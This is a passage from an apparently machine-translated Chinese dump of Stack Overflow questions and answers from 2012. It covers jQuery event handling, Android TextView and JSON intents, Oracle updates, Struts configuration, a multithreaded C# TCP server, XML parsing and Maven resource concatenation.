见最后一个小提琴：http: [//jsfiddle.net/YAdXk/13/](http://jsfiddle.net/YAdXk/13/)

```
(function($) {
$.fn.lock= function() {
    return this.each(function() {
        $(this).css('position','relative').prepend($('<div class="mask" style="position:absolute;z-index:9000;height:100%;width:100%;background-image:url('+transparent_picture+');"></div>')).find('input,textarea,select').attr('tabindex','-1');
    });
};   

$.fn.unlock= function() {
    return this.each(function() {
        $(this).find('*').removeAttr('tabindex').filter('.mask').remove();
   });
};

})( jQuery ) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T11:16:56.483

```
var all_events = "click blur focus mouse"; //etc...

$('form *').bind(all_events, function(event) {
        event.preventDefault();
}); 
```

现在更容易维护；）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T11:18:40.350

[jQuery在这里](https://github.com/jquery/jquery/blob/master/src/event.js#L1011)定义了所有快捷事件类型，因此您可以使用该字符串来存储所有事件以供重复使用：

```
var events = "blur focus focusin focusout load resize scroll unload click dblclick " +
"mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave " +
"change select submit keydown keypress keyup error contextmenu";

$('button').bind(events, function() {
    // hey
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-31T11:42:24.263

**是的，有可能一次捕获一种类型的所有事件！**但是您需要明确指定所有事件类型。

您的代码示例`"form *"`效率低下，并且不会捕获代码执行后添加的元素上的事件。

由于 javascript 事件的冒泡效应，您可以在最父元素上分配一个 catch all 事件处理程序，例如`$("form")`or `$("body")`，然后添加`preventDefault()`到该元素。

示例代码：

```
$("a").on("click", function() {
    $("body").append("<p>Clicked...</p>");
});
$("body").on("click", function(e) {
  e.preventDefault();
}); 
```

和：

```
<div>
    <p><a href="#" target="_blank">Click on me</a></p>
</div>​ 
```

*   在 JSfiddle 上：http: [//jsfiddle.net/erlang/EHeBK/](http://jsfiddle.net/erlang/EHeBK/)

在父元素上捕获所有事件的概念通常称为**事件委托**。

# android - 以固定大小的 TextView 显示字符串

> ID：12213973
> 
> 赞同：1
> 
> 时间：2012-08-31T11:00:02.620
> 
> 标签：android, textview

我有固定宽度和高度的 TextView 并想设置 String`"._MealTracker_2-MAR-2012_02-20PM.apk"`但在 textview 中仅显示`"."`无法获取它。为什么会发生？

```
 <TextView
                    android:id="@+id/TextView01"
                    android:layout_width="60dp"
                    android:layout_height="20dp"
                    android:layout_gravity="bottom|center_horizontal"
                    android:layout_marginBottom="@dimen/bottom_margin"
                    android:text="._MealTracker_2-MAR-2012_02-20PM.apk"
                    android:textColor="@color/bgblue" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:17:18.163

它无法正确显示，因为 android:singleLine 属性未设置，因此它考虑 multiline 。因此，您的文本设置为垂直。

如果您设置`android:singleLine="true"`，则**._MealT...**将显示在 textView 中。

![在此处输入图像描述](../Images/a67976e21920d85696b123a51e4fefc3.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T11:09:38.090

设置您的文本属性

```
android:singleLine="true" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T11:16:21.677

我尝试在我的 textView 中写入您的字符串，它对我有用.. 所以这可能是 textView 间距的问题，因为您的字符串太长而无法在一行中打印。

# oracle - Oracle Bulk Collect and Update from cursor or user Update with Select 子查询

> ID：12213979
> 
> 赞同：0
> 
> 时间：2012-08-31T11:01:03.097
> 
> 标签：oracle, oracle10g

我有 2 个选项可以根据选择查询的游标更新表。

假设我有这个选择查询：

```
select id1 from table1 
```

我的更新查询是：

```
update table2 set value=1 where table2.id2 = table1.id1 
```

现在有两个选项：

1.  为选择查询设置一个游标并批量获取它，然后在 for all 语句中触发更新查询。

2.  使用 select 子查询编写更新查询：

    update table2 set value=1 where table2.id2 in (select id1 from table1)

哪一个更好？

Oracle 是否在内部将选择子查询转换为批量收集，还是将其视为普通游标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:16:26.027

首先关于您的问题“Oracle 是否在内部将选择子查询转换为批量收集？”
不，优化器计算一个计划并以某种适当的方式从子查询中选择数据。不涉及批量收集。

对于您的问题“哪个更好？”。这要看情况。如果您可以制定一个查询，`table1.id1`一次运行即可获取所有信息，*并且*table2 有很多行，因此子选择很*昂贵*，那么我可能会使用批量收集。但请记住，根据数据量，您需要一些 PGA 来完成此操作。

但我可能会指出另一个 - 恕我直言，非常优雅 - 解决方案：

```
MERGE INTO table2
  USING (select id1 from table1)
   ON (id2 = id2)
  WHEN MATCHED THEN 
   UPDATE SET value=1
; 
```

这通常比执行子查询更快，也比批量收集更快：一次在 table1 上运行，一次在 table2 上运行。`where`（根据您的需要添加子句）

# java - 如何让struts2看到我的属性文件

> ID：12213982
> 
> 赞同：5
> 
> 时间：2012-08-31T11:01:21.737
> 
> 标签：java, jsp, properties, struts2

嗨我有这个项目结构

![在此处输入图像描述](../Images/b6627ed1597ee8921300e9ef696d51bb.png)

在我的`index.jsp`我有这个代码：

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="s" uri="/struts-tags"%>
<html>
  <head>
    <title>
        <s:text name="index.title" />
    </title>
  </head>
  <body>
    <s:form action="Login">
        <s:textfield key="index.login" name="login" />
        <s:password key="index.password" name="password" />
        <s:submit/>
    </s:form>
  </body>
</html> 
```

我的`content.property`文件如下所示：

```
index.hello = Hello user./n/r Please login
index.login = Login
index.password = Password
index.title = Login Page 
```

当我启动项目时，struts2 没有从我的属性文件中获取信息。请告诉我我做错了什么我在互联网上找不到任何有用的东西请帮助我谢谢=）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T11:09:50.330

您的属性文件需要在您的`classes`目录下`WEB-INF`或目录的`classes`子目录中。

假设你有这个结构 `.../Web-INF/classes/property/content.properties`，你需要在你的`struts.xml`

`<constant name="struts.custom.i18n.resources" value="property.content" />`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T07:39:38.243

首先将您的重命名`content.properties`为`global_en.properties`. 后来放到`src`文件夹里

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-15T00:15:37.640

您已经完成了所有事情，但您没有将属性文件名保留为 Action name 。名称应为 Login.property。

另外请确保属性文件必须与正在创建的针对它的操作位于同一包中。

详情请参考以下链接：

[http://struts.apache.org/release/2.2.x/docs/message-resource-files.html](http://struts.apache.org/release/2.2.x/docs/message-resource-files.html)

谢谢，沙希德·赛义德·汗

# java - 解析错误处理资源路径 jndi:/localhost/StrutsDataExport/WEB-INF/struts-config.xml

> ID：12213985
> 
> 赞同：0
> 
> 时间：2012-08-31T11:01:31.163
> 
> 标签：java, struts

嗨，我在启动服务器时遇到以下异常`tomcat 6.0`

```
SEVERE: Parsing error processing resource path jndi:/localhost/StrutsDataExport/WEB-INF/struts-config.xml
org.xml.sax.SAXParseException: Content is not allowed in trailing section. 
```

这就是我的`struts-config.xml`

`

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE struts-config PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 1.2//EN"
          "http://jakarta.apache.org/struts/dtds/struts-config_1_2.dtd">

<struts-config>
    <form-beans>
        <form-bean name="UserForm" type="com.report.UserForm" />
    </form-beans>

    <global-exceptions>

    </global-exceptions>

    <global-forwards>
        <forward name="welcome" path="/Welcome.htm" />
    </global-forwards>

    <action-mappings>
        <action input="/" name="UserForm" path="/userAction" scope="session"
            type="com.report.UserAction">
            <forward name="success" path="/user.jsp" />
        </action>
        <action path="/Welcome" forward="/welcomeStruts.jsp"/>
    </action-mappings>

    <controller processorClass="org.apache.struts.tiles.TilesRequestProcessor" />

    <message-resources parameter="com/report/ApplicationResource" />

    <plug-in className="org.apache.struts.tiles.TilesPlugin">
        <set-property property="definitions-config" value="/WEB-INF/tiles-defs.xml" />
        <set-property property="moduleAware" value="true" />
    </plug-in>

    <!--
        ========================= Validator plugin
        =================================
    -->
    <plug-in className="org.apache.struts.validator.ValidatorPlugIn">
        <set-property property="pathnames"
            value="/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml" />
    </plug-in>

</struts-config>
    -->
` 
```

我收到异常说我在 struts-config 文件中有问题但我无法找到，这就是为什么我在部署时遇到上述异常，我正在使用 netbeans IDE，请帮我解决这个问题

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-05-24T13:49:53.823

正如亚历克斯提到的，第一个问题是由尾随的“-->”引起的

第二个错误`org.apache.jasper.JasperException: The absolute uri: http://displaytag.sf.net cannot be resolved in either web.xml or the jar files deployed with this application` 是由错误的 taglib uri 声明引起的。

解决方案是这样声明标签库

```
<%@ taglib uri="http://displaytag.sf.net/el" prefix="display" %> 
```

代替

```
<%@ taglib uri="http://displaytag.sf.net/" prefix="display" %> 
```

# android - 如何将 JSON 对象传递给新活动

> ID：12213987
> 
> 赞同：7
> 
> 时间：2012-08-31T11:01:38.853
> 
> 标签：android, json, android-intent

我有一个应用程序需要使用 AsyncTask 从 URL 下载 JSON，并在 onPostExecute() 上使用 putExtra 方法将该 JSON 对象传递给下一个 Activity，但我不断收到错误消息，显示“putExtra 只能用于传递字符串和不是对象”？如何解决这个问题？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-08-31T11:04:17.523

传递参数时执行此操作：

```
intent.putExtra("json", jsonobj.toString()); 
```

在你的新活动中，像这样解析它：

```
JSONObject obj = new JSONObject(getIntent().getStringExtra("json")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-06-08T09:50:19.140

在您获取 JSON 数据的活动中，编写以下代码以发送到 TAB 活动

```
Intent i = new Intent(getApplicationContext(), Another_Activity.class);
                            i.putExtra("key", jsonObject.toString());
                            startActivity(i); 
```

访问数据即 JSON 对象在选项卡 Activity 中编写以下代码

```
 JSONObject jsonObject = new JSONObject(getIntent().getStringExtra("key"));
                    Toast.makeText(Another_Activity.this, ""+jsonObject.get("Your JSON VALUE"), Toast.LENGTH_SHORT).show(); 
```

您的 JSON VALUE 是数据中存在的字段。例如 "Business Id" 1 这里的业务 id 是 JSON 值，用你的替换它

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T11:12:02.927

您应该通过 putExtra 传递一个可序列化或可打包的对象，因为 JSONObject 既不是可序列化的也不是可打包的对象，因此您不能通过 putExtra 传递它。

所以你需要通过解析 JSONObject 来创建 Parcelable 或 Serializable 类，然后你可以使用 putExtra 方法来传递它。

另一个选项是从 jsonOjbect 传递 JSON 字符串。

# c# - 带 TCPclient 的多线程

> ID：12213988
> 
> 赞同：0
> 
> 时间：2012-08-31T11:01:39.853
> 
> 标签：c#, multithreading, tcpclient, thread-synchronization

我确实有一个多线程 TCPClient 应用程序的问题，每个 Client 对象都有一个接收和发送消息的线程和一个处理应该处理的任务的线程（取决于消息）......（例如创建并回答味精线程发送）。但是出了点问题……应用程序几乎总是使用 100% 的 cpu（如果任何线程有任务，那是大部分时间）。我也有一种感觉，一些线程的优先级低于其他线程（可以在一些日志中看到，例如，线程 1 中的操作比线程 2 中的操作花费的时间更长……有什么好的方法来处理这个问题吗？

我希望得到一些帮助或一些提示！有什么不清楚的就问吧：）

谢谢！/缺口

```
//Waiting for TCP-connections and creating them as they arrive. Starts a Thread that handles the messages recieved and sent with this thread.
private void ListenForClients()
{
    try
    {

        this.tcpListener.Start();
        while (true)
        {
            TcpClient client = this.tcpListener.AcceptTcpClient();

            Connection c = new Connection(this.parent);
            connectionCollection.Add(c);
            Thread clientThread = new Thread(new ParameterizedThreadStart(c.HandleClientComm));

            threadCollection.Add(clientThread);
            clientThread.Start(client);
        }
    }
    catch (Exception e)
    {
    }
}
//Connection constructor, creates a ToDo-thread, this handles the messages (DB, Filewriting etc.) recieived and    creats new ones to be sent.
public Connection()
{
    this.todo = new ArrayList();
    todoT = new Thread(handleToDo);
    todoT.Start();
}
//Messagehandeling-thread
 public void HandleClientComm(object client)
{
    try
    {

        TcpClient server = (TcpClient)client;

        NetworkStream ns = server.GetStream();
        byte[] data = new byte[1024];
        string input, stringData;
        online = true;
        DateTime lastTime = DateTime.Now;

        while (true && this.online)
        {
            try
            {
                if (lastTime.AddMinutes(2) < DateTime.Now)
                    break;

                data = new byte[1024];
                if (ns.DataAvailable && ns.CanRead)
                {
                    int recv = ns.Read(data, 0, data.Length);
                    if (recv > 0)
                    {
                        lastTime = DateTime.Now;
                        if ((byte)data[recv - 1] == (byte)255)
                        {
                            int cnt = -1;
                            for (int i = 0; i < recv; i++)
                            {
                                if (data[i] == (byte)254)
                                {
                                    cnt = i;
                                    break;
                                }
                            }

                            int nr = recv - cnt - 2;
                            byte[] tmp = new byte[nr];

                            for (int i = 0; i < nr; i++)
                            {
                                tmp[i] = data[cnt + i + 1];
                            }
                            string crc = Encoding.UTF8.GetString(tmp);
                            stringData = Encoding.UTF8.GetString(data, 0, cnt);

                            MsgStruct msgs = new MsgStruct(stringData);
                            msgs.setCrc(crc);

                            addTodo(msgs);
                            if (msgs.getMsg()[0] == 'T' && this.type == 1)
                                this.parent.cStructHandler.sendAck(msgs, this.ID);
                            Console.WriteLine(todo.Count);

                        }
                    }
                }
                if (parent.cStructHandler.gotMsg(this.ID))
                {
                    MsgStruct tmpCs = parent.cStructHandler.getNextMsg(this.ID);

                    if (tmpCs.getMsg().Length != 0 && ns.CanWrite)
                    {
                        byte[] ba = Encoding.UTF8.GetBytes(tmpCs.getMsg());

                        if (tmpCs.getCrc() == "")
                        {
                            ulong tmp = CRC.calc_crc(ba, ba.Length);
                            tmpCs.setCrc(tmp.ToString("X"));
                        }

                        if (tmpCs.canSendByTimeout())
                        {
                            string crcStr = "?" + tmpCs.getCrc() + "?";
                            byte[] bb = Encoding.UTF8.GetBytes(crcStr);
                            crcStr = Encoding.UTF8.GetString(bb);
                            byte[] fullMsg = new byte[ba.Length + bb.Length];
                            bb[0] = 254;
                            bb[bb.Length - 1] = 255;

                            ba.CopyTo(fullMsg, 0);
                            bb.CopyTo(fullMsg, ba.Length);
                            string s = System.Text.UTF8Encoding.ASCII.GetString(fullMsg);

                            ns.Write(fullMsg, 0, fullMsg.Length);
                            if (!tmpCs.isAckNeeded())
                                parent.cStructHandler.removeNextMsg(this.ID);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                break;
            }

        }
        ns.Close();
        server.Close();
        dead = true;
    }
    catch (Exception e)
    {
        dead = true;
    }
}

//Todo-thread

public void handleToDo()
{
    try
    {
        int cnt = 0;
        while (true)
        {
            if (todo.Count > 0)
            {
                 //SWITCH CASE FOR DIFFERENT MESSAGE TYPES, DOING TASKS DEPENDING ON WHAT ONES...
            } 
            else
            {
                if (dead)
                {
                    todoT.Abort();
                    todoT = null;
                    break;
                }
            }
       }
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:51:05.630

停止检查数据是否可用等，让 read() 阻塞。这就是它应该如何工作！

如果您想将内容写入套接字，请从另一个线程（直接从父对象？）执行此操作，或者更改您的设计以使用异步读/写。

循环、轮询、sleep() 等只是浪费 CPU 和/或为您的应用程序增加可避免的延迟。

# c# - C#中的XML解析

> ID：12213991
> 
> 赞同：0
> 
> 时间：2012-08-31T11:01:53.227
> 
> 标签：c#, xml

```
<CompanyRoot>
  <Company>
    <Name>Courier</Name>
    <Company>
      <Name>Dhl</Name>
      <Company>
        <Name>Test1</Name>
      </Company>
      <Company>
        <Name>Test4</Name>
        <Company>
          <Name>Test5</Name>
        </Company>
      </Company>
    </Company>
    <Company>
      <Name>BlueDart</Name>
      <Company>
        <Name>Test3</Name>
      </Company>
    </Company>
    <Company>
      <Name>FastFlight</Name>
    </Company>
  </Company>
</CompanyRoot> 
```

我有一个 xml，我希望 xml 后代的数量处于同一级别，即“Courier”的后代数量应该是 3（DHL/Bluedart/Fastflight）而不是 7 在 c# 中是否有可能

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T11:04:53.150

`Descendants`找到*所有*后代 - 你只想要直接的子元素：

```
var count = xElem.Elements("Company").Count(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:03:26.010

**评估这个 Xpath 表达式**：

```
count(/*/Company) 
```

# android - SQLite 执行查询并获取结果

> ID：12213996
> 
> 赞同：1
> 
> 时间：2012-08-31T11:02:01.307
> 
> 标签：android, sqlite

我有那个查询

```
 String queryMonthSize = "SELECT (julianday(Date('now')) -
    julianday(date('now','-1 month')) FROM "+ TABLE_STATISTICS; 
```

在 sqlite 上，它将返回两个日期的差异。

我如何在 android 代码上执行它，以便我返回字符串的数值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:06:58.137

您需要的是执行`rawquery`. 使用[本教程](http://www.codeproject.com/Articles/119293/Using-SQLite-Database-with-Android)作为参考。

您将在名为“执行查询”和“管理游标”的部分中找到用途。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:06:46.343

您的实施将是

```
queryMonthSizeIntValue = Integer.parseInt(queryMonthSize); 
```

请参阅静态 parseInt() 方法：

*   [http://developer.android.com/reference/java/lang/Integer.html](http://developer.android.com/reference/java/lang/Integer.html)

# maven - Javascript 和 CSS 文件在 Maven 构建中组合，无需压缩、缩小等

> ID：12213998
> 
> 赞同：10
> 
> 时间：2012-08-31T11:02:11.947
> 
> 标签：maven

是否有一个 Maven 插件只结合了 js 和 css 资源但不做任何缩小、模糊、压缩等？只是简单的资源连接。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T15:04:40.937

对您的项目进行以下更改：

1.  在您的**pom.xml**中，`<dependencies>`标记，放置：

    ```
    <!-- JAVASCRIPT COMBINATION -->
    <dependency>
        <groupId>ro.isdc.wro4j</groupId>
        <artifactId>wro4j-core</artifactId>
    </dependency> 
    ```

2.  在您的**pom.xml**中，`<plugins>`标记，放置：

    ```
    <plugin>
        <groupId>ro.isdc.wro4j</groupId>
        <artifactId>wro4j-maven-plugin</artifactId>
        <version>1.4.3</version>
        <executions>
            <execution>
                <phase>process-resources</phase>
                <goals>
                    <goal>run</goal>
                </goals>
            </execution>
        </executions>
        <configuration>
            <targetGroups>allDev</targetGroups>
            <destinationFolder>${basedir}/src/main/webapp/</destinationFolder>
            <contextFolder>${basedir}/src/main/webapp/</contextFolder>
        </configuration>
    </plugin> 
    ```

3.  在您的**pom.xml**（或父**pom.xml**）`<dependencyManagement>`标签中，放置：

    ```
    <!-- JAVASCRIPT COMBINATION -->
    <dependency>
        <groupId>ro.isdc.wro4j</groupId>
        <artifactId>wro4j-core</artifactId>
        <version>1.8.0</version>
    </dependency> 
    ```

4.  在下面创建一个**wro.xml**`/project/src/main/webapp/WEB-INF`并放置如下内容：

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <groups xmlns="http://www.isdc.ro/wro">  
        <group name="allDev">  
            <js minimize="false">/my1stJsFolder/*.js</js>
            <js minimize="false">/my2ndJsFolder/*.js</js>
            <js minimize="false">/someFileDirectlyUnderWEBINF.js</js>
        </group>
    </groups> 
    ```

5.  在**web.xml**中插入：

    ```
    <filter>
        <filter-name>WebResourceOptimizer</filter-name>
        <filter-class>ro.isdc.wro.http.WroFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>WebResourceOptimizer</filter-name>
        <url-pattern>/wro/*</url-pattern>
    </filter-mapping> 
    ```

**allDev.js**将在`/project/src/main/webapp`.

我还不确定如何告诉 wro4j 只在目标中生成一个（现在您有两个 - 一个在项目源文件中，一个在目标文件中）。

使用 yui 插件压缩时，我只得到一个目标。但这对你来说应该不是什么大问题。

更多：

*   [https://code.google.com/p/wro4j/wiki/GettingStarted](https://code.google.com/p/wro4j/wiki/GettingStarted)
*   [https://code.google.com/p/wro4j/wiki/MavenPlugin](https://code.google.com/p/wro4j/wiki/MavenPlugin)
*   [http://www.jarvana.com/jarvana/search?search_type=project&project=wro4j-maven-plugin](http://www.jarvana.com/jarvana/search?search_type=project&project=wro4j-maven-plugin)

**另外**：

如果您对资源处理有任何问题，请尝试添加到`<build>`标签：

```
<resources>
    <resource>
        <directory>src/main/resources</directory>
        <filtering>true</filtering>
    </resource>
</resources> 
```

并且还要`<plugins>`添加

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-resources-plugin</artifactId>
    <configuration>
        <nonFilteredFileExtensions>
            <nonFilteredFileExtension>pdf</nonFilteredFileExtension>
            <nonFilteredFileExtension>swf</nonFilteredFileExtension>
            <nonFilteredFileExtension>jpg</nonFilteredFileExtension>
            <nonFilteredFileExtension>jpeg</nonFilteredFileExtension>
            <nonFilteredFileExtension>class</nonFilteredFileExtension>
            <nonFilteredFileExtension>jks</nonFilteredFileExtension>
            <nonFilteredFileExtension>exe</nonFilteredFileExtension>
            <nonFilteredFileExtension>wmv</nonFilteredFileExtension>
            <nonFilteredFileExtension>jar</nonFilteredFileExtension>
            <nonFilteredFileExtension>zip</nonFilteredFileExtension>
            <nonFilteredFileExtension>gz</nonFilteredFileExtension>
        </nonFilteredFileExtensions>
    </configuration>
</plugin> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-02T14:42:39.867

我认为大多数工具都可以让你关闭缩小。

这是另一对看起来很有趣的夫妇：

[http://jawr.java.net/](http://jawr.java.net/)

[https://code.google.com/p/wro4j/](https://code.google.com/p/wro4j/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T14:35:38.883

我已经使用 YUI Compressor 多年了。以前在 ANT 中做，但也有一个 maven 插件。以下链接是聚合的示例：

[http://alchim.sourceforge.net/yuicompressor-maven-plugin/ex_aggregation.html](http://alchim.sourceforge.net/yuicompressor-maven-plugin/ex_aggregation.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T13:53:27.403

看起来正确：

[http://hammerfest.sourceforge.net/maven-javascript-plugin/merge-mojo.html](http://hammerfest.sourceforge.net/maven-javascript-plugin/merge-mojo.html)